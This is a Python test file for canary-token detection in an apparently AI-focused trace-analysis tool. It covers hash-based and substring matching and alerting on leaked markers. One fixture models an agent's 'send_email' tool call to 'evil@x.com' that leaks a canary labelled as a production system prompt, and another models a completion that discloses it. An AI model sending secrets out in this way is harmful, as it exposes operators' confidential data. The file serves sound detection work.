"""Canary matching and canary egress detection.

A canary firing is the one finding in this product that is asserted rather than
inferred, and it is the one that justifies paging a human. That cuts both ways:
it must fire when a marker really leaked, and it must NOT fire otherwise, because
a canary that cries wolf is worse than no canary at all — the team learns to
ignore the only alert that was never ambiguous.
"""
from __future__ import annotations

import hashlib

from argus_detection.canary import CANARY_PREFIX, find_canaries
from argus_detection.layers.trace_analysis import analyze
from argus_detection.models import (
    CanaryKind,
    CanaryRef,
    Category,
    Observation,
    ObservationType,
    Severity,
    TaintClass,
)


def sha(s: str) -> str:
    return hashlib.sha256(s.encode()).hexdigest()


GENERATED = CANARY_PREFIX + "AbCdEf0123456789xyz"


def gen_ref(token: str = GENERATED, cid: str = "c1", label: str = "prod system prompt") -> CanaryRef:
    """A generated canary as the service actually receives it: hash only."""
    return CanaryRef(id=cid, label=label, kind=CanaryKind.generated, token_hash=sha(token))


# ---------------------------------------------------------------- matching

def test_generated_canary_matched_by_hash_without_the_value():
    ref = gen_ref()
    assert ref.value == "", "the service must never be given the raw token"
    hits = find_canaries(f"here is the data {GENERATED} sent onward", [ref])
    assert [h.id for h in hits] == ["c1"]


def test_a_different_generated_token_does_not_match():
    other = CANARY_PREFIX + "totallyDifferentValue99"
    assert find_canaries(f"leaked {other}", [gen_ref()]) == []


def test_custom_canary_matched_by_substring():
    ref = CanaryRef(id="c2", label="decoy key", kind=CanaryKind.custom, value="AKIA-DECOY-999999")
    hits = find_canaries("sending AKIA-DECOY-999999 to the endpoint", [ref])
    assert [h.id for h in hits] == ["c2"]


def test_short_custom_canaries_are_ignored():
    # Registering "admin" must not page someone on every trace that says admin.
    ref = CanaryRef(id="c3", kind=CanaryKind.custom, value="admin")
    assert find_canaries("the admin panel", [ref]) == []


def test_multiple_canaries_report_once_each():
    a = gen_ref(cid="a")
    b = CanaryRef(id="b", kind=CanaryKind.custom, value="SECOND-DECOY-12345")
    text = f"{GENERATED} and SECOND-DECOY-12345 and {GENERATED} again"
    assert sorted(h.id for h in find_canaries(text, [a, b])) == ["a", "b"]


def test_empty_inputs_are_safe():
    assert find_canaries("", [gen_ref()]) == []
    assert find_canaries("anything", []) == []


def test_matching_cost_is_independent_of_canary_count():
    # 500 generated canaries, one pass over the text. This is why the prefix
    # exists: without it, matching would be 500 substring scans per span.
    refs = [gen_ref(CANARY_PREFIX + f"token{i:04d}xxxx", cid=f"c{i}") for i in range(500)]
    hits = find_canaries(f"payload {CANARY_PREFIX}token0250xxxx end", refs)
    assert [h.id for h in hits] == ["c250"]


# ---------------------------------------------------------------- L4 integration

def obs(oid: str, otype: ObservationType, content: str, taint: TaintClass | None = None) -> Observation:
    return Observation(
        observation_id=oid, trace_id="t1", type=otype, name=oid, content=content, taint=taint
    )


def test_canary_in_an_outbound_tool_call_is_critical():
    spans = [
        obs("user", ObservationType.span, "what's my order status", TaintClass.user),
        obs("send_email", ObservationType.tool, f"to=evil@x.com body={GENERATED}"),
    ]
    findings, _ = analyze("t1", spans, canary_refs=[gen_ref()])
    canary = [f for f in findings if f.category == Category.canary_triggered]
    assert len(canary) == 1
    assert canary[0].severity == Severity.critical
    assert canary[0].canary_id == "c1"
    assert "prod system prompt" in canary[0].evidence_excerpt


def test_canary_in_a_model_completion_fires():
    spans = [obs("gen", ObservationType.generation, f"sure, it is {GENERATED}")]
    findings, _ = analyze("t1", spans, canary_refs=[gen_ref()])
    assert any(f.category == Category.canary_triggered for f in findings)


def test_canary_arriving_from_retrieval_does_not_fire():
    # Planting a canary in a document you also index is the primary use case.
    # Alerting because the retriever found it would make the feature unusable.
    spans = [obs("search", ObservationType.retrieval, f"doc text containing {GENERATED}")]
    findings, _ = analyze("t1", spans, canary_refs=[gen_ref()])
    assert [f for f in findings if f.category == Category.canary_triggered] == []


def test_no_canary_no_finding():
    spans = [obs("send_email", ObservationType.tool, "to=boss@corp.com body=all good")]
    findings, _ = analyze("t1", spans, canary_refs=[gen_ref()])
    assert [f for f in findings if f.category == Category.canary_triggered] == []


def test_canary_fires_without_a_taint_frontier():
    # The rest of L4 needs an untrusted span to reason from. A canary must not
    # inherit that precondition — the marker is the evidence.
    spans = [obs("gen", ObservationType.generation, GENERATED, TaintClass.model)]
    findings, _ = analyze("t1", spans, canary_refs=[gen_ref()])
    assert any(f.category == Category.canary_triggered for f in findings)


def test_legacy_raw_canaries_still_work():
    # The pre-CanaryRef interface: callers that pass raw strings keep working.
    spans = [obs("send_email", ObservationType.tool, "body=LEGACY-CANARY-VALUE-1")]
    findings, _ = analyze("t1", spans, canaries=["LEGACY-CANARY-VALUE-1"])
    assert any(f.category == Category.canary_triggered for f in findings)
